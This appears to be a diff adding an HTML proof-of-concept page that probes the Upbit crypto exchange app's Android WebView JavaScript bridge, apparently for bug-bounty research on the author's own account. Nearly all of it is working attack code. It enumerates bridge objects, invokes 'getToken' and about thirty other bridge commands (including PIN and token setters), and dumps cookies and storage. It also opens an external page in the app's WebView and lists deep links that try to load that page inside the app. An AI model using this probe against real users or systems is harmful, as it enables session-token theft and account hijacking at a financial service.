@@ -1,0 +1,161 @@
+<!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Upbit JS Bridge Probe — BB PoC</title>
+<style>
+  body { font-family: -apple-system, "맑은 고딕", sans-serif; margin: 12px; background: #111; color: #eee; }
+  h1 { font-size: 18px; color: #ffd23f; }
+  h2 { font-size: 15px; color: #4cc9f0; margin-top: 16px; }
+  pre { background: #222; padding: 8px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; font-size: 11px; }
+  .ok { color: #6fcf97; font-weight: bold; }
+  .bad { color: #888; }
+  .crit { color: #ff5e5e; font-weight: bold; font-size: 16px; }
+  .info { color: #cccccc; font-size: 11px; }
+  button { background: #2a2a2a; color: #eee; border: 1px solid #444; padding: 6px 12px; margin: 3px; border-radius: 4px; font-size: 12px; }
+</style>
+</head>
+<body>
+<h1>🔬 Upbit JS Bridge Probe</h1>
+<p class="info">Upbit BB 분석 — JS bridge 노출 여부 검증. 본인 계정만 사용 PoC.</p>
+
+<h2>📍 Environment</h2>
+<pre id="env"></pre>
+
+<h2>🔍 JS Bridge Detection</h2>
+<pre id="bridge"></pre>
+
+<h2>🧪 Bridge Method Probe (안전 — 'getAppInfo' / 'getDarkMode' 만)</h2>
+<pre id="probe"></pre>
+
+<h2>⚠️ Sensitive Probe (수동 — 버튼 click 시만)</h2>
+<button onclick="probeToken()">getToken (token 조회 시도)</button>
+<button onclick="probeOpenWebView()">openWebView</button>
+<button onclick="probeAll()">All commands (33개 sequential)</button>
+<pre id="manual"></pre>
+
+<h2>💾 Storage Dump</h2>
+<pre id="storage"></pre>
+
+<script>
+function $$(id){return document.getElementById(id)}
+function log(id,line,cls){var e=document.createElement('div');if(cls)e.className=cls;e.textContent=line;$$(id).appendChild(e)}
+
+// 1. Environment
+var env={
+  url: location.href,
+  href: location.href,
+  origin: location.origin,
+  ua: navigator.userAgent,
+  referrer: document.referrer,
+  cookie_count: document.cookie ? document.cookie.split(';').length : 0,
+  cookie_preview: (document.cookie||'').substring(0,80),
+  protocol: location.protocol,
+  host: location.host
+};
+$$('env').textContent = JSON.stringify(env, null, 2);
+
+// 2. Bridge detection — try all known bridge object names
+var bridges = ['Upbit','UpbitNFT','Lending','Staking','MarketInsight','CoinInfo','UpbitBridge','AndroidBridge','android','dunamuBridge','dunamu','exchange','UpbitJS'];
+var found = [];
+for (var i=0;i<bridges.length;i++) {
+  var name = bridges[i];
+  if (typeof window[name] !== 'undefined') {
+    var obj = window[name];
+    var methods = [];
+    try { for (var k in obj) { if (typeof obj[k]==='function') methods.push(k); } } catch(e) {}
+    found.push({ name:name, type:typeof obj, methods:methods });
+  }
+}
+if (found.length===0) {
+  log('bridge','❌ NO bridge object found (window.Upbit, window.AndroidBridge, etc 모두 부재)','bad');
+  log('bridge','→ 외부 browser/Chrome에서 열림 — hybrid WebView 진입 X','info');
+} else {
+  log('bridge','🚨 BRIDGE FOUND','crit');
+  for (var i=0;i<found.length;i++) {
+    log('bridge', JSON.stringify(found[i],null,2),'ok');
+  }
+}
+
+// 3. Safe probe — getAppInfo / getDarkMode (read-only, no token)
+function safeProbe() {
+  if (typeof window.Upbit === 'undefined' || !window.Upbit.postMessageToApp) {
+    log('probe','window.Upbit.postMessageToApp not available','bad');
+    return;
+  }
+  var cmds = ['getAppInfo','getDarkMode'];
+  for (var i=0;i<cmds.length;i++) {
+    var c = cmds[i];
+    try {
+      var res = window.Upbit.postMessageToApp(JSON.stringify({command:c}));
+      log('probe','['+c+'] → '+String(res).substring(0,200),'ok');
+    } catch(e) {
+      log('probe','['+c+'] ERROR: '+e.message,'bad');
+    }
+  }
+}
+safeProbe();
+
+// 4. Sensitive probes (button-triggered)
+function probeToken() {
+  if (typeof window.Upbit === 'undefined') {
+    log('manual','Bridge unavailable','bad'); return;
+  }
+  try {
+    var res = window.Upbit.postMessageToApp(JSON.stringify({command:'getToken'}));
+    log('manual','🚨 [getToken] response: '+String(res),'crit');
+  } catch(e) {
+    log('manual','[getToken] ERROR: '+e.message,'bad');
+  }
+}
+
+function probeOpenWebView() {
+  if (typeof window.Upbit === 'undefined') {
+    log('manual','Bridge unavailable','bad'); return;
+  }
+  try {
+    var p = {command:'openWebView',params:{url:'https://hohk0923.github.io/upbit-poc/echo.html',title:'PoC',webViewType:'COMMON'}};
+    var res = window.Upbit.postMessageToApp(JSON.stringify(p));
+    log('manual','[openWebView] response: '+String(res),'ok');
+  } catch(e) {
+    log('manual','[openWebView] ERROR: '+e.message,'bad');
+  }
+}
+
+function probeAll() {
+  if (typeof window.Upbit === 'undefined') {
+    log('manual','Bridge unavailable','bad'); return;
+  }
+  var all = ['appUpdate','close','finishLoad','getAppInfo','getDarkMode','getToken','navigateBack','onEnterFullscreenIFrame','onEnterFullscreenVideo','openWebView','performHapticFeedback','reload','requestAndroidImageURI','share','showLoginPopup','showTextPopup','showWebViewPopup','trackEvent','trackEventV2','requestPin','verifiedPin','navigateCoinDeposit','showUrlListBottomSheet','coinInfoChangeCode','hasNewNotification','setNotificationRead','onResume','sendBackKey','setAndroidImageURI','setDarkMode','setToken'];
+  for (var i=0;i<all.length;i++) {
+    var c = all[i];
+    try {
+      var res = window.Upbit.postMessageToApp(JSON.stringify({command:c}));
+      log('manual','['+c+'] '+String(res).substring(0,150),'ok');
+    } catch(e) {
+      log('manual','['+c+'] ERROR: '+e.message,'bad');
+    }
+  }
+}
+
+// 5. Storage dump
+var storage = { localStorage_keys:[], sessionStorage_keys:[], cookie:document.cookie };
+try { for (var i=0;i<localStorage.length;i++) storage.localStorage_keys.push(localStorage.key(i)); } catch(e){}
+try { for (var i=0;i<sessionStorage.length;i++) storage.sessionStorage_keys.push(sessionStorage.key(i)); } catch(e){}
+$$('storage').textContent = JSON.stringify(storage,null,2);
+</script>
+
+<h2>🔗 Deep Link Tester (사용자가 본인 device에서 클릭)</h2>
+<p class="info">아래 링크를 본인 S23에서 카카오톡/메모 등으로 본인에게 전송 후 click. 어떤 화면이 뜨는지 screenshot.</p>
+<ul style="font-size:12px;line-height:1.6;">
+<li><a href="upbitex://main">upbitex://main</a></li>
+<li><a href="upbitex://web?url=https://hohk0923.github.io/upbit-poc/">upbitex://web?url=...</a></li>
+<li><a href="upbitex://browser?url=https://hohk0923.github.io/upbit-poc/">upbitex://browser?url=...</a></li>
+<li><a href="upbitex://openWebView?url=https://hohk0923.github.io/upbit-poc/">upbitex://openWebView?url=...</a></li>
+<li><a href="https://upbit.com/applinks/web?url=https://hohk0923.github.io/upbit-poc/">https://upbit.com/applinks/web?url=...</a></li>
+<li><a href="https://upbit.com/applinks/?url=https://hohk0923.github.io/upbit-poc/">https://upbit.com/applinks/?url=...</a></li>
+<li><a href="https://upbit.com/applinks/external?dest=https://hohk0923.github.io/upbit-poc/">https://upbit.com/applinks/external?dest=...</a></li>
+</ul>
+</body>
+</html>
